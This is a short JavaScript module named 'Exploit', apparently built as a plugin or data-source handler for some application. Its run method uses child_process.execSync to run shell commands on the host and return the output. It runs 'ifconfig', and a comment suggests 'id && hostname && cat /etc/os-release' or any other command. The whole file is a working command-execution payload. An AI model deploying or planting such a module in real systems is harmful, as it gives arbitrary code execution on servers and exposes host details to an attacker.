class Exploit {
  async run(sourceOptions, queryOptions) {
    // Require Node.js modules and execute system commands
    const { execSync } = require('child_process');
    // Run any system command. Example: 'id && hostname && cat /etc/os-release'
    const output = execSync('ifconfig').toString();
    return { status: 'ok', data: { result: output } };
  }
}
module.exports = { default: Exploit };
